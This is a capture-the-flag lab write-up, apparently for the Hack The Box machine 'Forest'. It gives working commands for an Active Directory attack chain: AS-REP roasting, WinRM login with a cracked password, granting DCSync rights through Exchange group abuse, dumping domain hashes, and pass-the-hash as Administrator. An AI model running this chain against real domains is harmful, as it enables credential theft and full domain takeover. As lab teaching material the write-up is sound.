# Forest: Machine Notes

## Recon

### Nmap
- Port 88/tcp: Kerberos
- Port 135/tcp: MSRPC
- Port 389/tcp: LDAP
- Port 445/tcp: SMB
- Port 5985/tcp: WinRM
- Domain: `htb.local`

### User Enumeration
- Extracted users via LDAP: `sebastien`, `lucinda`, `andy`, `mark`, `santi`, `svc-alfresco`.

## Initial Access

### AS-REP Roasting
- Checked for users with "Do not require Kerberos preauthentication" set:
```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.129.30.214 -no-pass -usersfile users.txt
```
- Captured hash for `svc-alfresco`.
- Cracked with Hashcat:
  - Password: `s3rvice`

### Foothold
- Access via WinRM:
```bash
evil-winrm -i 10.129.30.214 -u svc-alfresco -p 's3rvice'
```

## Privilege Escalation

### Exchange Windows Permissions Abuse
- `svc-alfresco` is a member of the "Service Accounts" group which often has delegated rights over other groups.
- Analysis via BloodHound shows a path to Domain Admin by abusing "Exchange Windows Permissions".
- Create a new domain user:
```powershell
net user NewUser password /add /domain
```
- Add `NewUser` to the "Exchange Windows Permissions" and "Remote Management Users" groups:
```powershell
net group "Exchange Windows Permissions" NewUser /add
net localgroup "Remote Management Users" NewUser /add
```
- Use `PowerView` to grant DCSync rights to `NewUser`:
```powershell
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\NewUser', $pass)
Add-ObjectAcl -PrincipalIdentity "NewUser" -Credential $cred -Rights DCSync
```

### DCSync (Secretsdump)
- Use the newly granted rights to dump domain hashes:
```bash
impacket-secretsdump htb.local/NewUser:'password'@10.129.30.214
```
- Captured Administrator hash: `32693b11e6aa90eb43d32c72a07ceea6`

## Root Access
- Gain shell as Administrator using PSExec:
```bash
impacket-psexec Administrator@10.129.30.214 -hashes :32693b11e6aa90eb43d32c72a07ceea6
```
